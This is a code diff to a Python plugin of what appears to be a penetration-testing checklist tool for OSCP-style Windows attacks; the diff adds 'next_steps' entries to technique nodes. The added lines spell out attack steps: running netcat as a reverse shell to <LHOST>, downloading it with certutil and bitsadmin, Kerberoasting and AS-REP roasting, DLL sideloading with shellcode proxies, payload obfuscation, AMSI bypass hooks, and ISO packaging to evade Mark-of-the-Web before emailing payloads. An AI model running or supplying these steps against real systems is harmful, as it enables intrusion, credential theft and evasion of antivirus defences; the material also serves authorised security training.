@@ -65,14 +65,13 @@ class WindowsCorePlugin(ServicePlugin):
             'children': []
         }
 
-        # Add all 6 Windows core technique categories
+        # Add all 5 Windows core technique categories
         tasks['children'].extend([
             self._get_powershell_techniques(target, context),
             self._get_powerview_techniques(target, context),
             self._get_av_bypass_techniques(target, context),
             self._get_uac_bypass_techniques(target, context),
-            self._get_authentication_techniques(target, context),
-            self._get_cmd_techniques(target, context)
+            self._get_authentication_techniques(target, context)
         ])
 
         return tasks
@@ -218,6 +217,11 @@ class WindowsCorePlugin(ServicePlugin):
                             'certutil: certutil -urlcache -split -f http://<LHOST>/nc.exe nc.exe',
                             'bitsadmin: bitsadmin /transfer myDownload http://<LHOST>/nc.exe C:\\Temp\\nc.exe'
                         ],
+                        'next_steps': [
+                            'Verify file integrity: Get-FileHash C:\\Temp\\nc.exe -Algorithm MD5',
+                            'Check if executable runs: Test-Path C:\\Temp\\nc.exe',
+                            'Execute payload: C:\\Temp\\nc.exe -e cmd.exe <LHOST> 443'
+                        ],
                         'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                         'notes': 'BITS Transfer = stealthy (uses Windows Update infrastructure). certutil flagged by many AVs.'
                     }
@@ -327,6 +331,11 @@ class WindowsCorePlugin(ServicePlugin):
                             'Use PowerShell ISE: powershell_ise.exe (often not blocked)',
                             'Use SysWOW64 PowerShell: %SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe',
                             'PowerShell from MSBuild: msbuild.exe payload.xml (see GreatSCT)'
+                        ],
+                        'next_steps': [
+                            'Check current policy: Get-ExecutionPolicy -List',
+                            'Test bypass: Run a simple script (e.g., Write-Host "Success")',
+                            'If AppLocker blocks PowerShell: Try PowerShell ISE or alternate execution methods'
                         ],
                         'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                         'notes': 'Execution policy is NOT a security boundary (Microsoft statement). More: https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/'
@@ -521,6 +530,12 @@ class WindowsCorePlugin(ServicePlugin):
                             'SharpView (C# port): https://github.com/tevora-threat/SharpView',
                             'BloodHound: More comprehensive (graph-based)',
                             'Manual: net user /domain, net group "Domain Admins" /domain'
+                        ],
+                        'next_steps': [
+                            'If ASREPRoastable users found: Get-NetUser -PreauthNotRequired | Get-ASREPHash',
+                            'If Kerberoastable users found: Invoke-Kerberoast | Export-CSV kerberoast.csv',
+                            'Check unconstrained delegation hosts for attack pivots',
+                            'Enumerate readable shares for sensitive data: Find-DomainShare -CheckShareAccess'
                         ],
                         'tags': ['OSCP:HIGH', 'ENUM', 'DOMAIN'],
                         'notes': 'PowerView latest: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1'
@@ -927,6 +942,11 @@ class WindowsCorePlugin(ServicePlugin):
                             'Reflective DLL injection: Load DLL in-memory (no disk write)',
                             'Process hollowing: Inject DLL into suspended process'
                         ],
+                        'next_steps': [
+                            'Test DLL execution: rundll32.exe payload.dll,DllMain',
+                            'If detected: Obfuscate with ConfuserEx or VMProtect',
+                            'For stealth: Implement DLL sideloading with signed binary'
+                        ],
                         'tags': ['OSCP:HIGH', 'AV_EVASION', 'STEALTH'],
                         'notes': 'DLLs scanned less frequently. rundll32 often whitelisted. Combine with sideloading for best evasion.'
                     }
@@ -960,6 +980,12 @@ class WindowsCorePlugin(ServicePlugin):
                             'Manual DLL proxying: Reverse engineer exports, forward manually',
                             'DLL order hijacking: Place DLL earlier in search path',
                             'WinSxS DLL hijacking: Use side-by-side assembly manifests'
+                        ],
+                        'next_steps': [
+                            'Use Siofra to scan for DLL hijack candidates: Siofra64.exe --mode file-scan --dll-hijack',
+                            'Generate proxy DLL: SharpDllProxy.exe --dll target.dll --payload shellcode.bin',
+                            'Test sideloading: Copy signed binary + proxy DLL to writable directory',
+                            'Verify application still functions (proxy forwarding works)'
                         ],
                         'tags': ['OSCP:HIGH', 'AV_EVASION', 'STEALTH'],
                         'notes': 'Tools: Siofra https://github.com/Cybereason/siofra, SharpDllProxy https://github.com/Flangvik/SharpDllProxy'
@@ -1033,6 +1059,11 @@ class WindowsCorePlugin(ServicePlugin):
                             'Nimcrypt: .NET PE crypter in Nim',
                             'InvisibilityCloak: C# obfuscator'
                         ],
+                        'next_steps': [
+                            'Test obfuscated payload: Check detection on antiscan.me',
+                            'Verify functionality: Ensure payload still executes correctly',
+                            'If still detected: Combine with encryption or DLL sideloading'
+                        ],
                         'tags': ['OSCP:MEDIUM', 'AV_EVASION', 'OBFUSCATION'],
                         'notes': 'ConfuserEx = control flow + strings + anti-tamper. Commercial fork: ConfuserEx 2. Increases entropy (AV red flag).'
                     }
@@ -1065,6 +1096,11 @@ class WindowsCorePlugin(ServicePlugin):
                             'AMSI amsiInitFailed bypass: Force init failure',
                             'AmsiScanBuffer patching: Overwrite function to return clean',
                             'Memory patching: Write ret instruction to AmsiScanBuffer'
+                        ],
+                        'next_steps': [
+                            'Implement hook using MinHook or Microsoft Detours library',
+                            'Test hook: Verify amsi.dll not in loaded modules (Get-Process -Id $PID | Get-Module)',
+                            'If EDR detects: Use kernel-mode hook or alternative AMSI bypass'
                         ],
                         'tags': ['OSCP:MEDIUM', 'AMSI_BYPASS', 'ADVANCED'],
                         'notes': 'Language-agnostic (works for all AMSI clients). Requires early hook (before DLL load). EDRs may detect.'
@@ -1099,6 +1135,11 @@ class WindowsCorePlugin(ServicePlugin):
                             'Sign binary: Code signing certificate (expensive)',
                             'VHD/VHDX: Similar to ISO, no MoTW',
                             'ZIP with password: MoTW not applied to extracted files (inconsistent)'
+                        ],
+                        'next_steps': [
+                            'Create ISO with PackMyPayload: PackMyPayload.py payload.exe output.iso',
+                            'Verify no MoTW: Mount ISO, check payload properties (no Zone.Identifier)',
+                            'Test on target: Send ISO via email or host for download'
                         ],
                         'tags': ['OSCP:HIGH', 'AV_EVASION', 'PHISHING'],
                         'notes': 'Tool: PackMyPayload https://github.com/mgeeky/PackMyPayload/. MoTW = NTFS-only (ISO/VHD = FAT32).'
